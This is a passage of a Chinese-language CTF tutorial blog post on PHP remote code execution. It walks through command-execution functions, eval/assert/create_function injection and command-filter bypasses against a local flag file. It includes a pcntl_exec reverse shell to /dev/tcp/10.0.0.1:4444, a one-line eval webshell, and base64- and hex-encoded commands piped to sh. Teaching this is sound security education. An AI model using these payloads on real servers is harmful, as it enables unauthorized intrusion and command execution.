invoke__">var_dump</span>(<span class="variable">$process</span>);</span><br><span class="line"><span class="comment">//输出结果</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="variable">$output</span>;</span><br></pre></td></tr></table></figure>
+
+<p>当然也可以使用fread()：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$output</span>=<span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/11.png" class="" width="11">
+
+<img src="/2026/02/28/RCE/12.png" class="" width="12">
+
+<p>当我把flag.txt替换为&#x2F;flag(实际不存在)，也能实现报错：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$error</span>=<span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/13.png" class="" width="13">
+
+<p>利用$pipes[0]，我们还可以实现动态给sort命令写入数据</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>), </span><br><span class="line">    <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>), </span><br><span class="line">    <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)  </span><br><span class="line">);</span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="string">&#x27;sort&#x27;</span>,<span class="variable">$descriptorspec</span>,<span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>],<span class="string">&quot;A\r\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>],<span class="string">&quot;C\r\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>],<span class="string">&quot;B\r\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>],<span class="number">4096</span>);</span><br><span class="line"><span class="variable">$error</span> = <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$process</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="variable">$output</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="variable">$error</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/14.png" class="" width="14">
+
+<p>sort这个命令后续详细再提，在这里它的功能是按首字母进行排序，这里不用flag.txt是因为根本不会去执行sort flag.txt这个命令，因为你传进去的数据作为标准输入，而不是命令行参数</p>
+<h2 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h2><p><code>pcntl</code> 全称是 **Process Control (进程控制)**，直接调用了操作系统的核心系统调用（在 Linux 下底层就是 <code>execve</code>），它是专门为 <strong>Linux&#x2F;Unix (POSIX 兼容)</strong> 系统设计的扩展，所以在windows环境下无法使用这个函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_exec(string $path, array $args = [], array $env_vars = []);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>$path</strong>: 可执行文件的路径，或者包含解释器路径的脚本（如 #!&#x2F;usr&#x2F;bin&#x2F;php）。</li>
+<li><strong>$args</strong>: 传递给程序的参数数组。</li>
+<li><strong>$env_vars</strong>: 传递给程序的环境变量数组，格式为 key &#x3D;&gt; value。</li>
+</ul>
+<p>调用pcntl_exec后，当前进程会被替换为指定的程序，原进程的代码段、数据段和堆栈段都会被新程序替换，但进程号保持不变。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/bin/cat&quot;</span>,<span class="keyword">array</span>(<span class="string">&quot;flag.txt&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>执行到pcntl_exec之后，php脚本会消散而被bash身份取代</p>
+<p>可以利用这个函数进行反弹shell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// PHP，请你立刻去死，并转生为一个连接10.0.0.1的Bash终端！</span></span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/bin/bash&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h1><p>eval这个东西不属于系统命令执行函数一类，他可以将参数作为php代码来执行，但他又不属于函数一类，而是与echo,if,while等一类的语言结构，就连disable_function都限制不了</p>
+<p>对于eval的应用还是特别常见的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span>  <span class="comment">//一句话木马</span></span><br></pre></td></tr></table></figure>
+
+<p>当我们传入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=ls</span><br><span class="line">cmd=cat flag</span><br></pre></td></tr></table></figure>
+
+<p>就能实现目录穿越和文件查看了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;system(&quot;sort flag.txt&quot;);&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/15.png" class="" width="15">
+
+<h1 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h1><p>assert，翻译叫做断言，属于一个标准函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert($a==1)</span><br><span class="line">如果$a的确等于1，那就不会发生什么，反之报错退出</span><br></pre></td></tr></table></figure>
+
+<p>但如果<strong>assert里面的内容不是判断语句</strong>，那么他就会像eval一样把字符串当作php代码执行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&#x27;system(&quot;sort flag.txt&quot;);&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/16.png" class="" width="16">
+
+<h1 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h1><p>这个函数原本是用来做正则表达式搜索和替换的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;2L47yY&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="string">&quot;ZLARYY&quot;</span>,<span class="variable">$flag</span>);</span><br><span class="line"><span class="comment">//将$flag中的flag替换为ZLARYY</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/17.png" class="" width="17">
+
+<p>不过在\e修饰下的preg_replace函数，php不会把替换后的内容当作普通字符串，而是当作php代码执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;2L47yY&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/.*/e&quot;</span>,<span class="string">&quot;system(&#x27;type  flag.txt&#x27;);&quot;</span>,<span class="variable">$flag</span>);</span><br><span class="line"><span class="comment">//.表示任意一个字符，*表示重复0次或无数次</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/18.png" class="" width="18">
+
+<p>这里输出两次是由于preg_replace进行了两次替换，第二次替换是将$flag字符串末尾的空字符替换了。</p>
+<p><strong>注意：替换后的内容现需要有返回值 ，否则会出现报错</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;2L47yY&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/.*/e&quot;</span>,<span class="string">&quot;echo 1&quot;</span>,<span class="variable">$flag</span>);</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/19.png" class="" width="19">
+
+<p>这是由于我无法把echo 1赋值给一个变量，所以需要system函数提供返回值</p>
+<h1 id="php可变函数"><a href="#php可变函数" class="headerlink" title="php可变函数"></a>php可变函数</h1><p>php可变函数源自于php中的一个规则：如果在一个变量的后面加上一对圆括号 <code>()</code>，PHP 就会自动去寻找与这个变量的值同名的函数，并尝试执行它，<strong>注意：找的是同名函数，eval和echo这种语言结构不适用</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$func</span>(<span class="variable">$arg</span>);</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/20.png" class="" width="20">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$func-&gt;system $arg-&gt;&#x27;type flag.txt&#x27;理解起来不难，最后一行代码变成了system(&#x27;type flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h1 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h1><p>create_function最开始作用是创建函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$add</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return $a+$b;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$add</span>(<span class="number">10</span>,<span class="number">20</span>);</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/21.png" class="" width="21">
+
+<p>不过他的底层逻辑实际上是这样：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;function \0lambda_1(<span class="subst">$a</span>,<span class="subst">$b</span>)&#123;return <span class="subst">$a</span>+<span class="subst">$b</span>;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>所以如果create_function内部参数可控的话，可以构造字符串闭合掉原本的function执行其他代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;echo &quot;&#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27;&quot;;&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>();</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/22.png" class="" width="22">
+
+<p>但如果我传入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=ZLARYY&quot;;&#125; system(&quot;type flag.txt&quot;);/*</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/23.png" class="" width="23">
+
+<p>显然成功执行了后面的代码</p>
+<h1 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h1><p>这个函数理解起来也挺好的，他有两个参数，第一个参数为函数名，第二个参数为函数内部的参数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;echo ZLARYY&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/24.png" class="" width="24">
+
+<p>实际上就是执行了<code>system(&#39;echo ZLARYY&#39;);</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>,<span class="variable">$arg</span>);</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/25.png" class="" width="25">
+
+<p>话说是不是很像php可变函数</p>
+<h1 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h1><p>这个函数与call_user_func函数差不多，只是他的第二个参数变成需要传入一个数组进去：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$func</span>,<span class="variable">$arg</span>);</span><br></pre></td></tr></table></figure>
+
+<p>也就是说需要传入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a=system&amp;b[]=type flag.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/26.png" class="" width="26">
+
+<h1 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h1><p>该函数的作用是把一个函数作用到数组的每一个元素中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 一个普通的转换函数 (PHP 内置函数，转大写)</span></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;strtoupper&#x27;</span>; </span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// array_map 开始工作：把 strtoupper 挨个作用于 &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>, <span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$result</span>); </span><br><span class="line"><span class="comment">// 输出：Array ( [0] =&gt; A [1] =&gt; B [2] =&gt; C )</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么我们就可以利用它一次执行多个命令：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$arg</span>);</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/27.png" class="" width="27">
+
+<p>%26是&amp;的URL编码，这里在传参只能用%26而不能用&amp;连接</p>
+<h1 id="常规绕过"><a href="#常规绕过" class="headerlink" title="常规绕过"></a>常规绕过</h1><p>我们已经了解了RCE漏洞相关的函数和语言结构，现在可以看看一些常规的过滤绕过技巧了：</p>
+<h2 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h2><ol>
+<li><p>如果是web传参，可以用<code>%09</code>和<code>%20</code>等URL编码代替</p>
+<img src="/2026/02/28/RCE/28.png" class="" width="28">
+
+<img src="/2026/02/28/RCE/29.png" class="" width="29">
+</li>
+<li><p>可以用<code>$IFS$1-9</code>代替</p>
+<img src="/2026/02/28/RCE/30.png" class="" width="30">
+</li>
+<li><p>用<code>$&#123;IFS&#125;</code>或者<code>&lt;&gt;</code>代替</p>
+<img src="/2026/02/28/RCE/32.png" class="" width="32">
+</li>
+<li><p>花括号<code>&#123;&#125;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;sort,flag.txt&#125;</span><br><span class="line">//单命令最后也需要加上逗号</span><br><span class="line">&#123;ls,&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/37.png" class="" width="37"></li>
+</ol>
+<p><strong>注：windows系统下测试${IFS}一类会失败，这些仅限于Linux的Bash</strong></p>
+<h2 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h2><ol>
+<li><p>base64编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;c29ydCBmbGFnLnR4dA==&quot;|base64 -d|sh</span><br><span class="line">//利用管道符的标准输出与标准输入，实际上执行sort flag.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/33.png" class="" width="33">
+</li>
+<li><p>hex编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;736f727420666c61672e7478740a&quot;|xxd -r -p|sh</span><br><span class="line"></span><br><span class="line">echo &quot;sort flag.txt&quot;|xxd //这行命令可以输出hex编码</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/34.png" class="" width="34">
+
+<p>如果服务器没有xxd命令可以使用$()命令替换等：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(printf &quot;\x73\x6F\x72\x74\x20\x66\x6C\x61\x67\x2E\x74\x78\x74&quot;)</span><br><span class="line"></span><br><span class="line">`printf &quot;\x73\x6F\x72\x74\x20\x66\x6C\x61\x67\x2E\x74\x78\x74&quot;`</span><br><span class="line"></span><br><span class="line">printf &quot;\x73\x6F\x72\x74\x20\x66\x6C\x61\x67\x2E\x74\x78\x74&quot;|sh</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/35.png" class="" width="35">
+</li>
+<li><p>拼接绕过</p>
+<p>这个技巧在一些时刻可以用于拼接assert，但是不能用于拼接eval</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//假如过滤了sort</span><br><span class="line">a=so;b=rt;$a$b flag.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/36.png" class="" width="36">
+</li>
+<li><p>%0a绕过绕过<code>;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls%0acat /flag</span><br><span class="line">//可以同时执行ls和cat命令</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>内联执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;a `sort flag.txt`&quot;</span><br><span class="line">//命令行会先执行反引号里面的内容，再输出内容拼接到外层</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/38.png" class="" width="38">
+</li>
+<li><p>引号截断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sort fl&quot;&quot;ag.txt</span><br><span class="line">sort fl&#x27;&#x27;ag.txt</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/39.png" class="" width="39">
+</li>
+<li><p>通配符代替</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?可以用来代替匹配一个字符</span><br><span class="line">*可以用来匹配多个字符</span><br><span class="line"></span><br><span class="line">sort fl??????</span><br><span class="line">sort fl*</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/40.png" class="" width="40">
+</li>
+<li><p>反斜杠转义</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">so\rt fl\ag.txt</span><br><span class="line">//过滤了sort和flag字符</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/41.png" class="" width="41">
+</li>
+<li><p>方括号<code>[]</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sort fl[a]g.txt</span><br><span class="line">//不可用于sort等关键字</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/42.png" class="" width="42"></li>
+</ol>
+<h1 id="无字母无数字RCE"><a href="#无字母无数字RCE" class="headerlink" title="无字母无数字RCE"></a>无字母无数字RCE</h1><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>如果题目要求不能使用字母和数字：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>可以采用异或运算：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果a,b两个值不相同则异或结果为1，相同则为0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;5&quot;</span>^<span class="string">&quot;Z&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/49.png" class="" width="49">
+
+<p>这里的结果显示5和Z的异或结果为o，具体原理如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">5的二进制：00110101</span><br><span class="line">Z的二进制：01011010</span><br><span class="line">按位进行异或运算：01101111 -&gt; 解码结果为o</span><br></pre></td></tr></table></figure>
+
+<p>所以我们可以通过其他字符比如<code>%$*&amp;</code>等经过异或运算得到字母数字</p>
